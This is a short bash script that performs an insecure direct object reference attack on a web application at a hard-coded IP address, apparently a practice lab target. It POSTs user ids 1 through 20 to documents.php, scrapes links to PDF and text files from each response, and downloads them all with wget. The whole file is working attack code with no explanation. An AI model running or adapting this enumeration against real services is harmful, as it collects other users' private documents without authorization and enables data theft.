#!/bin/bash

url="http://64.227.32.21:32022"

for i in {1..20}; do
        # grep and download all txt and pdf files
        for link in $(curl -s "$url/documents.php" -X POST --data-raw "uid=$i" | grep -oP "\/documents.*?\.[pdftx]{3}"); do
        
                wget -q $url/$link
        done
done